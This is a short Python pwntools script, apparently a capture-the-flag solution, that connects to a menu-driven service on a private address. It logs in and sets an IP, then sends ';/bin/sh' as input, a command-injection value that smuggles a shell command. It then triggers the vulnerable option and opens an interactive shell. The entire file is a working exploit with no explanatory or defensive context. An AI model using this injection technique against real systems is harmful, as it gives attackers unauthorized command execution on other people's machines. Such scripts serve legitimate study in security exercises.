#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.28"
port = 8888

r = remote(host,port)

def setip(ip):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(ip)

def ddos():
    r.recvuntil(":")
    r.sendline("2")

def logout():
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline("N")
    

r.recvuntil(":")
r.sendline("ddaa")
setip("8.8.8.8")
logout()
r.recvuntil(":")
r.sendline(";/bin/sh")
ddos()
r.interactive()

